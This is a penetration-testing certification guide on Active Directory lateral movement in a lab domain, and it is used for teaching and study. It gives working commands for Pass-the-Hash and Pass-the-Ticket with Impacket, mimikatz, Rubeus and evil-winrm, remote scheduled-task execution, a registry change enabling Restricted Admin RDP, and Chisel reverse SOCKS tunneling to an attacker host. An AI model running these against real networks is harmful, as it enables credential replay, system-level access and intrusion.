# Phase 02 — Lateral Movement

> eCPPT · Methodology — INE-Cybersecurity-Certifications-Guide

## Purpose

Lateral movement is how a foothold on one host becomes access to many. After credential harvesting (Phase 01 taught you where to look), this phase covers replaying those credentials across the network with Pass-the-Hash, Pass-the-Ticket, and the standard remote-execution channels, then tunneling through segments you cannot reach directly. Every technique below is for authorized labs and signed engagements only.

**Prerequisites:** the accounts, hosts, and hashes used below come from the lab in [labs/ad-lab-setup.md](../labs/ad-lab-setup.md) — `corp.local`, `jdoe`/`bob`/`da.smith`, `DC01`/`SRV01`, `10.10.10.x`. Nothing here is reachable without that environment (or your own equivalent); the guided chains are in [labs/attack-simulations.md](../labs/attack-simulations.md).

## What You Move With

- **NT hash** → Pass-the-Hash (PtH): authenticate to SMB, WMI, WinRM, PsExec, RDP (Restricted Admin). No password needed.
- **TGT / service ticket** → Pass-the-Ticket (PtT): inject a Kerberos ticket into your session and request services as that principal.
- **Net-NTLMv2 response** → usually relay or offline crack (see Phase 01).
- **Plaintext / cleartext credentials** → use with any protocol; prefer Kerberos when available.

## Pass-the-Hash (PtH)

The server only verifies that you know the NT hash; you never need the plaintext. Impacket tools take the hash as the password.

```bash
# Obtain hashes first (authorized host): mimikatz "sekurlsa::logonpasswords",
# or dump SAM/SYSTEM. Then replay:
impacket-psexec corp.local/jdoe@10.10.10.20 -hashes :8846f7eaee8fb117ad06bdd830b7586c
# Expected outcome: NT AUTHORITY\SYSTEM shell on the target via a temporary service
```

```bash
# Check which machines accept a hash with NetExec (SMB, ex-CrackMapExec), then pick a channel
nxc smb 10.10.10.0/24 -u jdoe -H 8846f7eaee8fb117ad06bdd830b7586c --local-auth
# Expected outcome: [+] rows with (Pwn3d!) when the user is local admin
```

**Why it may fail:** local-account token filtering and KB2871997-style hardening block PtH for local (non-domain) accounts in some configurations; domain admins are usually unaffected. Always test with a *domain* account first.

## Pass-the-Ticket (PtT)

Kerberos trusts the ticket, not a password. Steal a TGT from memory (or forge one — Phase 04) and inject it.

```powershell
# On a Windows host, from mimikatz
sekurlsa::tickets /export          # exports .kirbi tickets from memory
kerberos::ptt C:\loot\TGT.kirbi    # inject into the current logon session
klist                            # expected outcome: cached ticket listed
```

```powershell
# Rubeus: request a TGT with a hash and inject in one step (authorized lab)
Rubeus.exe asktgt /user:jdoe /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt
# Expected outcome: [*] TGT ticket successfully imported
```

```bash
# Linux: export the ticket to a ccache file and use Impacket with -k
export KRB5CCNAME=/home/kali/jdoe.ccache
impacket-psexec -k -no-pass corp.local/jdoe@filesrv.corp.local
# Expected outcome: SYSTEM shell — no password or hash supplied at runtime
```

## Remote Execution Channels

| Channel | Ports | Tooling | Notes |
|---|---|---|---|
| PsExec-style (SMB) | 445 | `impacket-psexec`, `smbexec.py`, Sysinternals PsExec | Creates a service on `ADMIN$`; loudest, needs admin over SMB |
| WMI | 135 + 445 | `impacket-wmiexec`, `wmic` | Executes via WMI; `wmiexec` returns output by writing to `ADMIN$` over 445, so it needs admin |
| WinRM | 5985/5986 | `evil-winrm`, `winrm` | Cleanest output; user needs Remote Management Users/admin rights |
| Scheduled tasks | 445 / RPC | `impacket-atexec`, `schtasks` | Executes one command as SYSTEM via Task Scheduler |
| SMB shares | 445 | `smbclient`, manual | Stage payloads; execute via another channel |

```bash
# WMI execution
impacket-wmiexec corp.local/jdoe@10.10.10.30 -hashes :8846f7eaee8fb117ad06bdd830b7586c
# Expected outcome: C:\> prompt on the remote host

# WinRM shell
evil-winrm -i 10.10.10.30 -u jdoe -H 8846f7eaee8fb117ad06bdd830b7586c
# Expected outcome: Evil-WinRM shell — best for output-heavy work
```

```powershell
# Native scheduled task over the network (from an already-admin session)
schtasks /create /s 10.10.10.30 /u corp\jdoe /p 'P@ssw0rd!' /tn updater /tr "cmd /c whoami > C:\Windows\Temp\out.txt" /sc once /st 00:00
schtasks /run /s 10.10.10.30 /tn updater
# Expected outcome: task runs; check C:\Windows\Temp\out.txt on the target
```

**Choose by noise budget:** PsExec events (service create/delete, 7045) are the most detectable; WMI and WinRM produce fewer artifacts but still log 4624-type logons with distinct logon types.

## RDP Hopping

RDP is a common path when 445/5985 are filtered and when you need an interactive desktop.

```bash
# Pass-the-Hash over RDP requires Restricted Admin mode on the target
xfreerdp /v:10.10.10.40 /u:jdoe /pth:8846f7eaee8fb117ad06bdd830b7586c /cert-ignore
# Expected outcome: interactive desktop as jdoe WITHOUT sending a plaintext password
```

```bash
# Enable Restricted Admin remotely when you already have admin rights (authorized):
# reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0
```

Mind RDP hygiene: drive/clipboard redirection can copy malware or steal files into/out of the session, and RDP sessions cache credentials on the client (a harvesting target). Use `/drive:` only when the engagement requires it.

## Tunneling Between Hosts

When the target can reach a network your Kali cannot, route through a pivot host.

```bash
# SSH dynamic SOCKS (works on Linux pivots and Windows with OpenSSH server)
ssh -D 1080 -N pivotuser@pivot-host
# Then: proxychains nmap -sT -Pn 10.20.30.0/24    (targets resolved through the tunnel)

# SSH local forward: expose a remote-only port on your Kali
ssh -L 3389:10.20.30.5:3389 pivotuser@pivot-host
# Expected outcome: xfreerdp /v:127.0.0.1 reaches the inner host
```

```bash
# Chisel for Windows pivots without SSH (client on Kali, server on pivot or vice versa)
./chisel server -p 8080 --reverse          # Kali side
chisel.exe client <KALI-IP>:8080 R:1080:socks   # pivot side
# Expected outcome: SOCKS5 proxy on Kali 127.0.0.1:1080 through the pivot
```

```text
# Logical flow inside one segment compromise:
# DC/other nets  <-- reachable only from 10.10.10.30 (pivot)
# Kali --SMB/WinRM--> 10.10.10.30 --SOCKS/port-forward--> 10.20.30.x
```

Rule of thumb: keep tool traffic inside the tunnel; run port scans with `-sT` (SOCKS is TCP-only), and reduce scan intensity so the pivot host and target don't fall over or light up the SOC.

## Common Mistakes & Tips

- **PtH against the wrong account type:** try domain accounts before local; local-account token filtering silently kills many PtH attempts.
- **Forgetting the LM half:** most Impacket tools expect the `LMHASH:NTHASH` pair — exactly two fields. When you only have the NT hash, leave the LM half empty (`-hashes :NTHASH`) or reuse the `aad3b435b51404eeaad3b435b51404ee` placeholder (`-hashes aad3b435b51404eeaad3b435b51404ee:NTHASH`); a third colon makes Impacket fail to unpack the value.
- **WinRM vs. PSRemoting trust:** `evil-winrm` uses WinRM; some hosts allow one and not the other — test both channels.
- **Single-channel tunnel:** always record which internal networks each compromised host can reach (`ipconfig`/`route print`) before pivoting, or you will tunnel blind.
- **Leaving services behind:** PsExec-style tools create services/tasks; remove them (`sc delete`/`schtasks /delete`) in the lab and note cleanup in your report.
- **Detection awareness:** note Windows Event IDs 4624 (logon), 4648 (explicit credentials), 4672 (admin), 4688/1 (process creation), and Sysmon 3 (network) — high-volume channel use is how defenders catch lateral movement.

## Checklist / Self-Test

- [ ] I can perform PtH against SMB, WMI, and WinRM with Impacket and explain when each fails.
- [ ] I can export and inject Kerberos tickets (mimikatz/Rubeus) and use a ccache with `-k` from Linux.
- [ ] I can create and run a remote scheduled task and retrieve its output.
- [ ] I can pick the quietest execution channel for a given objective and justify it.
- [ ] I can hop via RDP using Restricted Admin / PtH without sending plaintext passwords.
- [ ] I can set up SOCKS and port-forward tunnels (SSH and Chisel) and scan a remote segment through them.
- [ ] I know which log/event artifacts each movement technique leaves behind.

> **Verification:** the Impacket `-hashes` format was checked against upstream `examples/psexec.py` (line 87, `hashes.split(':')`; `metavar = "LMHASH:NTHASH"` at line 613) and the wmiexec output path against upstream `examples/wmiexec.py` (default share `ADMIN$`) on 2026-09-19. Corrections applied from the 19 Sep 2026 audit.

## Further Resources

- Microsoft Learn — Windows authentication and logon types: https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-logon-scenarios
- MITRE ATT&CK — Lateral Movement tactics (T1550 PtH/PtT, T1021 remote services): https://attack.mitre.org/
- Impacket documentation and examples: https://github.com/fortra/impacket
- Chisel documentation: https://github.com/jpillora/chisel
- HackTricks — Lateral movement in Windows/AD: https://book.hacktricks.wiki/en/windows-hardening/lateral-movement.html
- Sysinternals PsExec official page: https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
